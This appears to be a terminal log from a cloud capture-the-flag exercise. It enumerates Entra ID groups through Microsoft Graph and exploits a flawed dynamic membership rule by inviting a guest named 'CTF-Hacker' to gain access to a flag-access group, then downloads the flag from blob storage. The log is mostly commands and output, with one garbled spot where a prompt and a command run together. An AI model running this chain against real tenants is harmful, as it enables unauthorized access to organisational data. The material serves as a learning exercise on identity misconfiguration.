+      "preferredDataLocation": null,
+      "preferredLanguage": null,
+      "proxyAddresses": [],
+      "renewedDateTime": "2025-08-19T12:23:34Z",
+      "resourceBehaviorOptions": [],
+      "resourceProvisioningOptions": [],
+      "securityEnabled": true,
+      "securityIdentifier": "S-1-12-1-826078047-1200262212-3071363770-471617168",
+      "theme": null,
+      "uniqueName": null,
+      "visibility": null,
+      "onPremisesProvisioningErrors": [],
+      "serviceProvisioningErrors": []
+    },
+    {
+      "id": "4bf7b481-58bb-4631-afe9-7af96ce822e4",
+      "deletedDateTime": null,
+      "classification": null,
+      "createdDateTime": "2025-08-19T14:14:59Z",
+      "creationOptions": [],
+      "description": null,
+      "displayName": "DynGrp-Guests-Only",
+      "expirationDateTime": null,
+      "groupTypes": [
+        "DynamicMembership"
+      ],
+      "infoCatalogs": [],
+      "isAssignableToRole": null,
+      "mail": null,
+      "mailEnabled": false,
+      "mailNickname": "e5e564ea-7",
+      "membershipRule": "(user.userType -eq \"Guest\")",
+      "membershipRuleProcessingState": "On",
+      "onPremisesDomainName": null,
+      "onPremisesLastSyncDateTime": null,
+      "onPremisesNetBiosName": null,
+      "onPremisesSamAccountName": null,
+      "onPremisesSecurityIdentifier": null,
+      "onPremisesSyncEnabled": null,
+      "preferredDataLocation": null,
+      "preferredLanguage": null,
+      "proxyAddresses": [],
+      "renewedDateTime": "2025-08-19T14:14:59Z",
+      "resourceBehaviorOptions": [],
+      "resourceProvisioningOptions": [],
+      "securityEnabled": true,
+      "securityIdentifier": "S-1-12-1-1274524801-1177639099-4185581999-3827492972",
+      "theme": null,
+      "uniqueName": null,
+      "visibility": null,
+      "onPremisesProvisioningErrors": [],
+      "serviceProvisioningErrors": []
+    },
+    {
+      "id": "7d060bb7-75e4-456e-b46f-382f4ff0c4fd",
+      "deletedDateTime": null,
+      "classification": null,
+      "createdDateTime": "2025-08-19T14:16:41Z",
+      "creationOptions": [],
+      "description": "Users assigned access to flag",
+      "displayName": "Users assigned access to flag",
+      "expirationDateTime": null,
+      "groupTypes": [
+        "DynamicMembership"
+      ],
+      "infoCatalogs": [],
+      "isAssignableToRole": null,
+      "mail": null,
+      "mailEnabled": false,
+      "mailNickname": "44a9daaf-2",
+      "membershipRule": "(user.department -eq \"Finance\") and (user.jobTitle -eq \"Manager\") or (user.displayName -startsWith \"CTF\") and (user.userType -eq \"Guest\") or (user.city -eq \"Seattle\")",
+      "membershipRuleProcessingState": "On",
+      "onPremisesDomainName": null,
+      "onPremisesLastSyncDateTime": null,
+      "onPremisesNetBiosName": null,
+      "onPremisesSamAccountName": null,
+      "onPremisesSecurityIdentifier": null,
+      "onPremisesSyncEnabled": null,
+      "preferredDataLocation": null,
+      "preferredLanguage": null,
+      "proxyAddresses": [],
+      "renewedDateTime": "2025-08-19T14:16:41Z",
+      "resourceBehaviorOptions": [],
+      "resourceProvisioningOptions": [],
+      "securityEnabled": true,
+      "securityIdentifier": "S-1-12-1-2097548215-1164867044-792227764-4257542223",
+      "theme": null,
+      "uniqueName": null,
+      "visibility": null,
+      "onPremisesProvisioningErrors": [],
+      "serviceProvisioningErrors": []
+    },
+    {
+      "id": "cc27dfa8-2df1-4f84-99b7-c2d91e1e762e",
+      "deletedDateTime": null,
+      "classification": null,
+      "createdDateTime": "2025-08-19T12:25:40Z",
+      "creationOptions": [],
+      "description": "Security group for auditors with read-only permissions to resources",
+      "displayName": "SecGrp-ReadOnly-Auditors",
+      "expirationDateTime": null,
+      "groupTypes": [],
+      "infoCatalogs": [],
+      "isAssignableToRole": null,
+      "mail": null,
+      "mailEnabled": false,
+      "mailNickname": "secgrp-readonly-auditors",
+      "membershipRule": null,
+      "membershipRuleProcessingState": null,
+      "onPremisesDomainName": null,
+      "onPremisesLastSyncDateTime": null,
+      "onPremisesNetBiosName": null,
+      "onPremisesSamAccountName": null,
+      "onPremisesSecurityIdentifier": null,
+      "onPremisesSyncEnabled": null,
+      "preferredDataLocation": null,
+      "preferredLanguage": null,
+      "proxyAddresses": [],
+      "renewedDateTime": "2025-08-19T12:25:40Z",
+      "resourceBehaviorOptions": [],
+      "resourceProvisioningOptions": [],
+      "securityEnabled": true,
+      "securityIdentifier": "S-1-12-1-3425165224-1334062577-3653416857-779492894",
+      "theme": null,
+      "uniqueName": null,
+      "visibility": null,
+      "onPremisesProvisioningErrors": [],
+      "serviceProvisioningErrors": []
+    },
+    {
+      "id": "df2dab3d-1276-49e1-9d63-a4d29302dd36",
+      "deletedDateTime": null,
+      "classification": null,
+      "createdDateTime": "2025-08-19T12:23:49Z",
+      "creationOptions": [],
+      "description": "Security group for data scientists with access to ML and analytics resources",
+      "displayName": "SecGrp-Data-Scientists",
+      "expirationDateTime": null,
+      "groupTypes": [],
+      "infoCatalogs": [],
+      "isAssignableToRole": null,
+      "mail": null,
+      "mailEnabled": false,
+      "mailNickname": "secgrp-data-scientists",
+      "membershipRule": null,
+      "membershipRuleProcessingState": null,
+      "onPremisesDomainName": null,
+      "onPremisesLastSyncDateTime": null,
+      "onPremisesNetBiosName": null,
+      "onPremisesSamAccountName": null,
+      "onPremisesSecurityIdentifier": null,
+      "onPremisesSyncEnabled": null,
+      "preferredDataLocation": null,
+      "preferredLanguage": null,
+      "proxyAddresses": [],
+      "renewedDateTime": "2025-08-19T12:23:49Z",
+      "resourceBehaviorOptions": [],
+      "resourceProvisioningOptions": [],
+      "securityEnabled": true,
+      "securityIdentifier": "S-1-12-1-3744312125-1239487094-3533988765-920453779",
+      "theme": null,
+      "uniqueName": null,
+      "visibility": null,
+      "onPremisesProvisioningErrors": [],
+      "serviceProvisioningErrors": []
+    }
+  ]
+}
+user@monthly-challenge:~$ curl -s -X POST "https://graph.microsoft.com/v1.0/invitations" \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "invitedUserEmailAddress": "XXXXXXXXXX@gmail.com",
+    "invitedUserDisplayName": "CTF-Hacker",
+    "inviteRedirectUrl": "https://myapps.microsoft.com/?tenantid=967a4bc4-782a-492d-a5d5-afe8a7550b5f"
+  }'
+{"@odata.context":"https://graph.microsoft.com/v1.0/$metadata#invitations/$entity","id":"0114b1cd-6020-40b8-a3a5-133147d3b7f3","inviteRedeemUrl":"https://login.microsoftonline.com/redeem?rd=https%3a%2f%2finvitations.microsoft.com%2fredeem%2f%3ftenant%3dd26f353d-c564-48e7-b26f-aa48c6eecd58%26user%3d0114b1cd-6020-40b8-a3a5-133147d3b7f3%26ticket%3d7Z4eq2Pcqcrb1bQilqIX%25252fFVf%25252biVI7rMGT3Q%25252f6d7ixjU%25253d%26ver%3d2.0","invitedUserDisplayName":"CTF-Hacker","invitedUserType":"Guest","invitedUserEmailAddress":"XXXXXXXXXX@gmail.com","sendInvitationMessage":false,"resetRedemption":false,"inviteRedirectUrl":"https://myapps.microsoft.com/?tenantid=967a4bc4-782a-492d-a5d5-afe8a7550b5f","status":"PendingAcceptance","invitedUserMessageInfo":{"messageLanguage":null,"customizedMessageBody":null,"ccRecipients":[{"emailAddress":{"name":null,"address":null}}]},"invitedUser":{"id":"687282f8-b319-4a4f-af67-0ef6fa88abc9","userPrincipalName":"XXXXXXXXXX_gmail.com#EXT#@wizctfchallenge.onmicrosoft.com"}}user@monthly-chcurl -s -H "Authorization: Bearer $TOKEN" \r $TOKEN" \
+  "https://graph.microsoft.com/v1.0/groups/7d060bb7-75e4-456e-b46f-382f4ff0c4fd/appRoleAssignments" | jq .
+{
+  "@odata.context": "https://graph.microsoft.com/v1.0/$metadata#appRoleAssignments",
+  "value": [
+    {
+      "id": "twsGfeR1bkW0bzgvT_DE_V5Q7va9YiVJhNbO-CHOKZM",
+      "deletedDateTime": null,
+      "appRoleId": "00000000-0000-0000-0000-000000000000",
+      "createdDateTime": "2025-08-19T17:40:17.6948177Z",
+      "principalDisplayName": "Users assigned access to flag",
+      "principalId": "7d060bb7-75e4-456e-b46f-382f4ff0c4fd",
+      "principalType": "Group",
+      "resourceDisplayName": "CTF Challenge Flag",
+      "resourceId": "80b871a5-ce2b-4685-81e8-a02ea36dcf65"
+    }
+  ]
+}
+user@monthly-challenge:~$ curl -s -H "Authorization: Bearer $TOKEN" \
+  "https://graph.microsoft.com/v1.0/servicePrincipals/80b871a5-ce2b-4685-81e8-a02ea36dcf65" | jq .
+{
+  "error": {
+    "code": "Authorization_RequestDenied",
+    "message": "Insufficient privileges to complete the operation.",
+    "innerError": {
+      "date": "2026-04-13T12:12:04",
+      "request-id": "d3bb0989-0b2c-43d2-b027-d91c3ac06d29",
+      "client-request-id": "d3bb0989-0b2c-43d2-b027-d91c3ac06d29"
+    }
+  }
+}
+user@monthly-challenge:~$ az login --tenant azurectfchallengegame.com --use-device-code --allow-no-subscriptions
+To sign in, use a web browser to open the page https://login.microsoft.com/device and enter the code DHSY4KBC2 to authenticate.
+
+Retrieving subscriptions for the selection...
+
+[Tenant and subscription selection]
+
+No     Subscription name    Subscription ID                       Tenant
+-----  -------------------  ------------------------------------  ------------------------------------
+[1] *  Test Group           5dcc0e04-85ce-46dd-83c5-7703bb165aaf  d26f353d-c564-48e7-b26f-aa48c6eecd58
+
+The default is marked with an *; the default tenant is 'd26f353d-c564-48e7-b26f-aa48c6eecd58' and subscription is 'Test Group' (5dcc0e04-85ce-46dd-83c5-7703bb165aaf).
+
+Select a subscription and tenant (Type a number or Enter for no changes): 
+
+Tenant: d26f353d-c564-48e7-b26f-aa48c6eecd58
+Subscription: Test Group (5dcc0e04-85ce-46dd-83c5-7703bb165aaf)
+
+[Announcements]
+With the new Azure CLI login experience, you can select the subscription you want to use more easily. Learn more about it and its configuration at https://go.microsoft.com/fwlink/?linkid=2271236
+
+If you encounter any problem, please open an issue at https://aka.ms/azclibug
+
+[Warning] The login output has been updated. Please be aware that it no longer displays the full list of available subscriptions by default.
+
+user@monthly-challenge:~$ az storage blob download \
+  --account-name azurechallengectfflag \
+  --container-name grab-the-flag \
+  --name ctf_flag.txt \
+  --file ./flag.txt \
+  --auth-mode login
+Finished[#############################################################]  100.0000%
+{
+  "container": "grab-the-flag",
+  "content": "",
+  "contentMd5": null,
+  "deleted": false,
+  "encryptedMetadata": null,
+  "encryptionKeySha256": null,
+  "encryptionScope": null,
+  "hasLegalHold": null,
+  "hasVersionsOnly": null,
+  "immutabilityPolicy": {
+    "expiryTime": null,
+    "policyMode": null
+  },
+  "isAppendBlobSealed": null,
+  "isCurrentVersion": null,
+  "lastAccessedOn": null,
+  "metadata": {},
+  "name": "ctf_flag.txt",
+  "objectReplicationDestinationPolicy": null,
+  "objectReplicationSourceProperties": [],
+  "properties": {
+    "appendBlobCommittedBlockCount": null,
+    "blobTier": null,
+    "blobTierChangeTime": null,
+    "blobTierInferred": null,
+    "blobType": "BlockBlob",
+    "contentLength": 55,
+    "contentRange": "bytes None-None/55",
+    "contentSettings": {
+      "cacheControl": null,
+      "contentDisposition": null,
+      "contentEncoding": null,
+      "contentLanguage": null,
+      "contentMd5": "84we9DsrNXj4AFpgH4BX0A==",
+      "contentType": "text/plain"
+    },
+    "copy": {
+      "completionTime": null,
+      "destinationSnapshot": null,
+      "id": null,
+      "incrementalCopy": null,
+      "progress": null,
+      "source": null,
+      "status": null,
+      "statusDescription": null
+    },
+    "creationTime": "2025-08-12T19:50:00+00:00",
+    "deletedTime": null,
+    "etag": "\"0x8DDD9D96C66138F\"",
+    "lastModified": "2025-08-12T19:50:00+00:00",
+    "lease": {
+      "duration": null,
+      "state": "available",
+      "status": "unlocked"
+    },
+    "pageBlobSequenceNumber": null,
+    "pageRanges": null,
+    "rehydrationStatus": null,
+    "remainingRetentionDays": null,
+    "serverEncrypted": true
+  },
+  "rehydratePriority": null,
+  "requestServerEncrypted": true,
+  "snapshot": null,
+  "tagCount": null,
+  "tags": null,
+  "versionId": null
+}
+user@monthly-challenge:~$ cat ./flag.txt
+WIZ_CTF{EntraID_SensXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}user@monthly-challenge:~$
